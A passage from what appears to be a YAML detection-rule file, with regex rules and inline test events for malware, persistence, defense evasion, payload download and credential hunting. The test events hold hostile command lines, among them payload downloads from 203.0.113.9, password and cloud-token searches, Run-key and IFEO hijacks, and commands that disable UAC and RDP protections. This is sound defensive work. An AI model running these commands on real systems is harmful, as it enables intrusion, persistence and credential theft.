    - {event: {title: 'SYN flood detected on edge-fw-1'}, expect_match: true}
    - {event: {event_type: network.ddos_mitigation}, expect_match: true}
    - {event: {title: 'Firewall rule updated'}, expect_match: false}

- id: TB-IMPACT-007
  name: Forced shutdown or reboot of a host from the command line
  severity: low
  confidence: 45
  techniques: [T1529]
  tags: [impact, availability]
  tuning: Low confidence on its own; valuable as a stage in a correlated chain.
  match:
    any:
      - {field: command_line, regex: 'shutdown(\.exe)?\s.{0,20}(/s|/r|-h|-r|-P)\s.{0,20}(/f|/t\s?[01]\b|now)'}
      - {field: command_line, regex: '\b(poweroff|halt|init\s+0)\s+(-f|--force)'}
  tests:
    - {event: {command_line: 'shutdown /s /f /t 0'}, expect_match: true}
    - {event: {command_line: 'shutdown /a'}, expect_match: false}

# =============================================================== MALWARE / SUSPICIOUS FILE & PROCESS
- id: TB-MAL-001
  name: Malware family, offensive framework or AV detection reported
  severity: high
  confidence: 80
  techniques: [T1204.002]
  tags: [malware, av-detection]
  match:
    any:
      - {field: text, regex: '\b(wannacry|notpetya|emotet|qakbot|qbot|trickbot|icedid|bumblebee|redline stealer|raccoon stealer|lumma|asyncrat|njrat|remcos|agent ?tesla|formbook|lokibot|dridex|ursnif|gozi|zloader|blackcat|alphv|lockbit|ryuk|conti|blackbasta)\b'}
      - {field: text, regex: 'X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE'}
      - {field: event_type, regex: '^(antivirus|av|edr|malware)\.(detect|quarantin|block|threat|alert)'}
      - {field: raw.threat_name, regex: '.{3,}'}
  tests:
    - {event: {event_type: antivirus.detected, raw_data: {threat_name: 'Trojan.GenericKD.1234'}}, expect_match: true}
    - {event: {raw_data: {content: 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'}}, expect_match: true}
    - {event: {title: 'Contiguous block allocation failed'}, expect_match: false}

- id: TB-MAL-002
  name: Executable launched from a user-writable or memory-backed location
  severity: medium
  confidence: 60
  techniques: [T1204.002, T1036]
  tags: [malware, staging]
  tuning: Installers and portable apps run from Downloads; focus on servers or add the parent to exclusions.
  match:
    all:
      - {field: event_type, regex: '^process\.(start|create)'}
      - {field: raw.process_path, regex: '(/dev/shm/|/var/tmp/\.|/tmp/\.|\\appdata\\local\\temp\\.{0,60}\.exe|\\users\\public\\.{0,60}\.exe|\\programdata\\.{0,60}\.(exe|scr)|\\downloads\\.{0,60}\.(exe|scr)|memfd:)'}
      - not: {field: raw.parent_process, regex: '^(msiexec|setup|installer|chrome|msedge|firefox|explorer|svchost|ccmexec|intunemanagementextension)(\.exe)?$'}
  tests:
    - {event: {event_type: process.start, raw_data: {process_path: 'C:\Users\bob\AppData\Local\Temp\a1b2.exe', parent_process: 'cmd.exe'}}, expect_match: true}
    - {event: {event_type: process.start, raw_data: {process_path: '/dev/shm/kworker', parent_process: bash}}, expect_match: true}
    - {event: {event_type: process.start, raw_data: {process_path: 'C:\Program Files\App\app.exe', parent_process: explorer.exe}}, expect_match: false}

- id: TB-MAL-003
  name: Double-extension or script file executed from a document-themed name
  severity: high
  confidence: 70
  techniques: [T1204.002, T1036]
  tags: [malware, masquerading]
  match:
    any:
      - {field: process_name, regex: '\.(pdf|docx?|xlsx?|txt|jpe?g|png)\.(exe|scr|com|bat|cmd|js|vbs)$'}
      - {field: command_line, regex: '\.(pdf|docx?|xlsx?|txt|jpe?g|png)\.(exe|scr|com|bat|cmd|js|vbs)\b'}
  tests:
    - {event: {process_name: 'invoice.pdf.exe'}, expect_match: true}
    - {event: {process_name: 'invoice.exe'}, expect_match: false}

# =============================================================== INSIDER / SUSPICIOUS USER ACTIVITY
- id: TB-INSIDER-001
  name: Bulk document or repository download / export
  severity: medium
  confidence: 60
  techniques: [T1213, T1530, T1005]
  tags: [insider, data-theft]
  tuning: Tune the count to your normal sync/export behaviour; consider per-role allow-lists.
  match:
    all:
      - {field: event_type, regex: '^(file|document|storage|repository)\.(download|export|bulk|clone)'}
      - {field: raw.file_count, gte: 100}
  tests:
    - {event: {event_type: file.download_bulk, raw_data: {file_count: 850}}, expect_match: true}
    - {event: {event_type: file.download, raw_data: {file_count: 1}}, expect_match: false}

- id: TB-INSIDER-002
  name: Access by a disabled, terminated or suspended account
  severity: high
  confidence: 80
  techniques: [T1078]
  tags: [insider, identity, offboarding]
  match:
    any:
      - {field: raw.user_status, in: [terminated, disabled, suspended, deprovisioned, deactivated]}
      - {field: text, regex: '(sign-?in|login|access) (attempt )?(by|from|with) (a )?(disabled|terminated|deprovisioned|suspended|deactivated) (account|user)'}
  tests:
    - {event: {event_type: authentication.success, raw_data: {user_status: terminated}}, expect_match: true}
    - {event: {event_type: authentication.success, raw_data: {user_status: active}}, expect_match: false}

- id: TB-INSIDER-003
  name: Access to sensitive data store by an unusual process or with restricted-classification marker
  severity: medium
  confidence: 55
  techniques: [T1213, T1005]
  tags: [insider, data-access]
  match:
    any:
      - {field: raw.data_classification, in: [restricted, secret, confidential-hr, pii-bulk, phi]}
      - {field: command_line, regex: '(select|dump|copy|export).{0,60}(from|table)\s.{0,40}(ssn|credit_?card|payroll|salaries|patient|pii|passport)'}
  tests:
    - {event: {raw_data: {data_classification: restricted}}, expect_match: true}
    - {event: {raw_data: {data_classification: public}}, expect_match: false}

# =============================================================== CONTAINER / WORKLOAD RUNTIME
- id: TB-CONT-001
  name: Runtime sensor alert from a container workload (shell, sensitive read, escape)
  severity: high
  confidence: 70
  techniques: [T1609, T1611, T1552.001]
  tags: [container, runtime, falco]
  match:
    any:
      - all:
          - {field: event_type, regex: '^container\.'}
          - {field: raw.priority, in: [critical, alert, emergency]}
      - all:
          - {field: event_type, regex: '^container\.'}
          - {field: text, regex: '(terminal shell in container|shell (was )?spawned (in|by) (a )?container|read sensitive file untrusted|write below (binary|etc) dir|netcat remote code execution|drop and execute new binary|contact k8s api server from container|detect (outbound connections to common miner pools|crypto miners?)|container drift detected|launch (privileged|sensitive mount) container)'}
  tests:
    - {event: {event_type: container.runtime_alert, raw_data: {priority: Critical, rule: 'Terminal shell in container'}}, expect_match: true}
    - {event: {event_type: container.runtime_alert, raw_data: {priority: Notice, rule: 'Container health check'}}, expect_match: false}

- id: TB-CONT-002
  name: Kubernetes API accessed anonymously or from an unexpected identity
  severity: high
  confidence: 70
  techniques: [T1078, T1613]
  tags: [kubernetes, identity]
  match:
    any:
      - all:
          - {field: event_type, regex: '^container\.k8s\.'}
          - {field: username, regex: '^system:anonymous$'}
          - {field: raw.response_code, in: [200, 201, 202]}
      - all:
          - {field: event_type, regex: '^container\.k8s\.'}
          - {field: raw.verb, in: [delete, deletecollection]}
          - {field: raw.resource, in: [namespaces, nodes, clusterroles, persistentvolumes]}
  tests:
    - {event: {event_type: container.k8s.audit, username: 'system:anonymous', raw_data: {response_code: 200}}, expect_match: true}
    - {event: {event_type: container.k8s.audit, username: 'system:anonymous', raw_data: {response_code: 403}}, expect_match: false}

# =============================================================== IDENTITY PROVIDER SPECIFIC
- id: TB-IDP-001
  name: Identity provider security control weakened (MFA policy, session policy, SSO or admin role)
  severity: high
  confidence: 70
  techniques: [T1556, T1098]
  tags: [identity, okta, azure-ad]
  match:
    any:
      - {field: raw.eventType, in: [policy.lifecycle.update, policy.rule.update, policy.lifecycle.deactivate, policy.rule.deactivate, user.mfa.factor.deactivate, user.mfa.factor.reset_all, system.api_token.create, application.lifecycle.update, user.account.privilege.grant, group.privilege.grant]}
      - {field: event_type, regex: '^identity\.(policy_changed|mfa_disabled|mfa_reset|api_token_created|sso_config_changed)'}
  tests:
    - {event: {raw_data: {eventType: user.mfa.factor.reset_all}}, expect_match: true}
    - {event: {raw_data: {eventType: user.session.start}}, expect_match: false}

# =============================================================== ROUND 3 ADDITIONS
# Added after the independent Atomic Red Team evaluation (tuning half only; the blind half was never inspected). Each rule keeps
# its benign twins as inline tests: a pattern that cannot tell an administrator from an adversary is not a rule.
- id: TB-PERSIST-008
  name: Registry autostart, hijack or logon-persistence value written (command line)
  severity: high
  confidence: 75
  techniques: [T1547.001, T1546.012, T1546.015, T1112]
  tags: [persistence, registry]
  tuning: Installers write Run keys and COM registrations. Values under Program Files / Windows are ignored; add your software-deployment account to the exclusions.
  match:
    all:
      - any:
          - {field: command_line, regex: '(\breg(\.exe)?\s+add|\breg(\.exe)?\s+import|set-itemproperty|new-itemproperty|new-item\b|\bsp\s|set-item\s|\bsi\s)'}
      - any:
          - all:
              - {field: command_line, regex: '\\currentversion\\(run|runonce|runonceex|runservices|policies\\explorer\\run)\b'}
              - not: {field: command_line, regex: '(c:\\program files|c:\\windows\\system32|%programfiles|%systemroot%|%windir%)[^ ]{0,200}\.(exe|dll)'}
          - {field: command_line, regex: '\\windows nt\\currentversion\\(winlogon\b.{0,60}\b(shell|userinit|notify|appsetup|taskman|vmapplet)\b|windows\b.{0,40}\b(appinit_dlls|load|run)\b|image file execution options\\\S{1,40}|silentprocessexit)'}
          - {field: command_line, regex: '\\environment\b.{0,40}userinitmprlogonscript|\\control panel\\desktop\b.{0,40}scrnsave\.exe|\\user shell folders\b.{0,60}startup|\\command processor\b.{0,40}autorun'}
          - {field: command_line, regex: '(\\classes)?\\clsid\\\{[0-9a-f-]{36}\}\\(inprocserver32|localserver32|shell\\open\\command|treatas)|\\classes\\(ms-settings|mscfile|exefile|folder|appx\w{4,40}|\.\w{2,6}file)\\shell\\open\\command'}
          - {field: command_line, regex: '\\control\\(lsa\b.{0,40}(authentication packages|security packages|notification packages)|session manager\b.{0,40}(bootexecute|appcertdlls)|print\\monitors|timeproviders|netsh)\b'}
          - {field: command_line, regex: '\\services\\\S{1,60}\b.{0,30}(imagepath|servicedll)'}
  tests:
    - {event: {command_line: 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\bob\AppData\upd.exe /f'}, expect_match: true}
    - {name: Winlogon Userinit appended, event: {command_line: 'Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\Users\Public\a.exe"'}, expect_match: true}
    - {name: shell open command hijack, event: {command_line: 'reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f'}, expect_match: true}
    - {name: IFEO debugger, event: {command_line: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe'}, expect_match: true}
    - {name: vendor autostart under Program Files, event: {command_line: 'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Zoom /t REG_SZ /d "C:\Program Files\Zoom\bin\Zoom.exe" /f'}, expect_match: false}
    - {name: reading the Run key, event: {command_line: 'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run'}, expect_match: false}
    - {name: unrelated vendor setting, event: {command_line: 'reg add HKCU\Software\Vendor\App /v Theme /d dark'}, expect_match: false}

- id: TB-EVADE-013
  name: Protection or audit control switched off through the registry or execution policy (command line)
  severity: high
  confidence: 75
  techniques: [T1112, T1562.001, T1548.002, T1021.001]
  tags: [defense-evasion, registry, uac, rdp]
  tuning: Hardening baselines and GPO tooling write these values; exclude the managing account or process.
  match:
    all:
      - any:
          - {field: command_line, regex: '(\breg(\.exe)?\s+add|set-itemproperty|new-itemproperty|\bsp\s|set-executionpolicy|set-mppreference|add-mppreference)'}
      - any:
          - {field: command_line, regex: '\\policies\\system\b.{0,80}\b(enablelua|consentpromptbehavioradmin|filteradministratortoken|promptonsecuredesktop|enableinstallerdetection|enablevirtualization)\b.{0,60}(/d\s+0\b|-value\s+0\b)'}
          - {field: command_line, regex: '\\policies\\system\b.{0,80}\blocalaccounttokenfilterpolicy\b.{0,60}(/d\s+1\b|-value\s+1\b)'}
          - {field: command_line, regex: '\\(policies|software)\\.{0,100}\b(disabletaskmgr|disableregistrytools|disablecmd|disablelockworkstation|norun|nodrives|disablecontextmenusinstartmenu)\b.{0,60}(/d\s+1\b|-value\s+1\b|0x0+1\b)'}
          - {field: command_line, regex: '\\terminal server\b.{0,80}(fdenytsconnections\b.{0,40}(/d\s+0\b|-value\s+0\b)|userauthentication\b.{0,40}(/d\s+0\b|-value\s+0\b)|allowremotertfm\b.{0,30}1)'}
          - {field: command_line, regex: 'set-executionpolicy\s.{0,40}(bypass|unrestricted)\b'}
          - {field: command_line, regex: '\\microsoft\\office\\\S{0,60}\\(security\\)?(accessvbom|vbawarnings|blockcontentexecutionfrominternet|trusted locations)\b.{0,40}(/d\s+[01]\b|-value\s+[01]\b)'}
          - {field: command_line, regex: '\\control\\securityproviders\\wdigest\b.{0,60}uselogoncredential'}
          - {field: command_line, regex: '\\windows defender\b.{0,100}(exclusions|disable\w{3,30}|passiveMode|tamperprotection)'}
  tests:
    - {event: {command_line: 'cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'}, expect_match: true}
    - {event: {command_line: 'New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1'}, expect_match: true}
    - {event: {command_line: 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine'}, expect_match: true}
    - {event: {command_line: 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'}, expect_match: true}
    - {event: {command_line: 'Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0'}, expect_match: true}
    - {name: restoring the secure value, event: {command_line: 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f'}, expect_match: false}
    - {name: querying, event: {command_line: 'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'}, expect_match: false}
    - {name: execution policy RemoteSigned is the sane default, event: {command_line: 'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser'}, expect_match: false}

- id: TB-EVADE-014
  name: Signed Windows binary copied to another name or location (renamed LOLBin)
  severity: medium
  confidence: 65
  techniques: [T1036.003, T1218]
  tags: [defense-evasion, masquerading, lolbin]
  tuning: Some backup and imaging tools copy system binaries; scope by account.
  match:
    any:
      - {field: command_line, regex: '(copy|move|xcopy|copy-item|cp)\s+("|'')?\S{0,40}\\(system32|syswow64)\\(certutil|rundll32|regsvr32|mshta|wscript|cscript|bitsadmin|msbuild|installutil|cmstp|ie4uinit|wmic|forfiles|powershell|cmd|odbcconf|regsvcs|regasm|msiexec|esentutl)\.exe("|'')?\s+("|'')?\S{1,120}'}
      - {field: command_line, regex: '\b(mkdir|md|new-item\s+-itemtype\s+directory)\s+"?\\\\\?\\[a-z]:\\windows\s+\\system32'}
  tests:
    - {event: {command_line: 'copy %windir%\system32\certutil.exe %temp%\tcm.tmp'}, expect_match: true}
    - {event: {command_line: 'copy c:\windows\system32\ie4uinit.exe %TEMP%\ie4uinit.exe'}, expect_match: true}
    - {name: mocked trusted directory, event: {command_line: 'mkdir "\\?\C:\Windows \System32\"'}, expect_match: true}
    - {name: copying an ordinary file, event: {command_line: 'copy C:\reports\q1.xlsx D:\backup\q1.xlsx'}, expect_match: false}

- id: TB-EXEC-010
  name: Executable or script downloaded to disk by a command-line client
  severity: medium
  confidence: 60
  techniques: [T1105, T1204]
  tags: [ingress-tool-transfer, download]
  tuning: Build agents and installers (choco, scoop, nvm, rustup) fetch scripts and binaries; exclude by parent_process or destination path.
  match:
    any:
      - {field: command_line, regex: '(invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b|\bcurl(\.exe)?(?=\s)|\bwget(\.exe)?(?=\s)|start-bitstransfer|\.downloadfile\s*\(|\.downloaddata\s*\(|certutil(\.exe)?(?=\s).{0,40}-urlcache|bitsadmin(\.exe)?(?=\s).{0,40}/(transfer|addfile)).{0,260}\.(exe|dll|ps1|psm1|bat|cmd|vbs|vbe|js|jse|hta|sct|sh|elf|jar|msi|scr|lnk|py|bin)\b'}
      - all:
          - {field: command_line, regex: '(invoke-webrequest|invoke-restmethod|\biwr\b|\bcurl(\.exe)?\b|\bwget(\.exe)?\b|start-bitstransfer|\.downloadfile\s*\()'}
          - {field: command_line, regex: 'https?://(\d{1,3}\.){3}\d{1,3}(:\d+)?/'}
          - {field: command_line, regex: '(-outfile|\s-o\s|\s-o\.|-o/|--output|\s>\s?|\.downloadfile)'}
  tests:
    - {event: {command_line: '(New-Object System.Net.WebClient).DownloadFile("https://203.0.113.9/payload.exe", "$env:TEMP\p.exe")'}, expect_match: true}
    - {event: {command_line: 'curl -fsSL https://203.0.113.9/install.sh -o /tmp/i.sh'}, expect_match: true}
    - {event: {command_line: 'Invoke-WebRequest -Uri http://203.0.113.9/a -OutFile C:\Users\Public\a'}, expect_match: true}
    - {name: package tarball is routine, event: {command_line: 'wget https://downloads.example.com/pkg-1.2.tar.gz -O /tmp/pkg.tgz'}, expect_match: false}
    - {name: API call without a file, event: {command_line: 'curl.exe -fsS https://api.vendor.example/health'}, expect_match: false}
    - {name: page saved to disk, event: {command_line: 'curl -o /tmp/page.html https://example.org'}, expect_match: false}

- id: TB-CRED-006
  name: Credential material hunted in files, stores or cloud/CI token caches
  severity: medium
  confidence: 65
  techniques: [T1552.001, T1555, T1552.004]
  tags: [credential-access, secrets, discovery]
  tuning: Secret scanners and backup agents read these; exclude by process_name.
  match:
    any:
      - {field: command_line, regex: '(findstr|select-string|sls)\s.{0,60}("|'')?(pass(word|wd)?|pwd|secret|cred(ential)?s?|api[_-]?key|token)("|'')?.{0,80}(\*\.(xml|ini|config|txt|cfg|conf|ps1|env|json|yml|yaml|bat|cmd|vbs)|-recurse|/s\b)'}
      - {field: command_line, regex: '\b(dir|ls|get-childitem|gci)\b.{0,60}(\*(pass|cred|secret|vnc)\w{0,10}\*|\*\.(kdbx|pfx|p12|ppk|pem|key|ovpn)\b)'}
      - {field: command_line, regex: '(type|cat|more|get-content|gc)\s+\S{0,80}(unattend|sysprep|autounattend|groups|services|scheduledtasks|printers|drives|datasources)\.xml\b'}
      - {field: command_line, regex: '\\(microsoft\\(credentials|vault|protect)|google\\chrome\\user data\\default\\login data)\b.{0,30}'}
      - {field: command_line, regex: '\b(vaultcmd|cmdkey)(\.exe)?\s+/(list|listcreds)|reg(\.exe)?\s+query\s.{0,80}/f\s+("|'')?pass(word)?("|'')?.{0,30}/s'}
      - {field: command_line, regex: '\bfind\s+/\S{0,10}\s.{0,80}(-name|-path)\s+("|'')?\*?/?\.?(azure|oci|aws|gcloud|kube|docker|boto|s3cfg|netrc|pgpass|git-credentials|npmrc|pypirc)\S{0,30}|\bfind\s+/\S{0,10}\s.{0,60}-name\s+("|'')?(terraform\.tf(vars|state)|id_rsa|id_ed25519|credentials|\*\.(kdbx|pem|ppk))'}
      - {field: command_line, regex: '(msal_token_cache|accesstokens|azureprofile)\.json|\.config/gcloud/(credentials|access_tokens)|\.azure/'}
      - {field: command_line, regex: '\b(lazagne|mimikittenz|snaffler|seatbelt\s+-group|credentialsfileview|sharpdpapi|sharpchrome|donpapi)\b'}
  tests:
    - {event: {command_line: 'findstr /si password *.xml *.ini *.txt'}, expect_match: true}
    - {event: {command_line: 'type C:\Windows\Panther\unattend.xml'}, expect_match: true}
    - {event: {command_line: 'dir /a:h C:\Users\bob\AppData\Local\Microsoft\Credentials\'}, expect_match: true}
    - {event: {command_line: "find / -path '*/.azure/msal_token_cache.json' -type f 2>/dev/null"}, expect_match: true}
    - {event: {command_line: 'reg query HKLM /f password /t REG_SZ /s'}, expect_match: true}
    - {event: {command_line: 'cmdkey /list'}, expect_match: true}
    - {name: ordinary search, event: {command_line: 'findstr /si TODO *.cs'}, expect_match: false}
    - {name: ordinary listing, event: {command_line: 'dir C:\reports /s'}, expect_match: false}
    - {name: reading a hosts file, event: {command_line: 'type C:\Windows\System32\drivers\etc\hosts'}, expect_match: false}

- id: TB-EXEC-011
  name: Signed-binary proxy execution through a known abusable export or switch
  severity: high
  confidence: 75
  techniques: [T1218.011, T1218, T1218.005, T1218.010]
  tags: [lolbin, proxy-execution, defense-evasion]
  tuning: Control-panel applets use shell32 Control_RunDLL; the pattern here requires a non-standard target.
  match:
    any:
      - {field: command_line, regex: 'rundll32(\.exe)?\s+(vbscript|javascript):'}
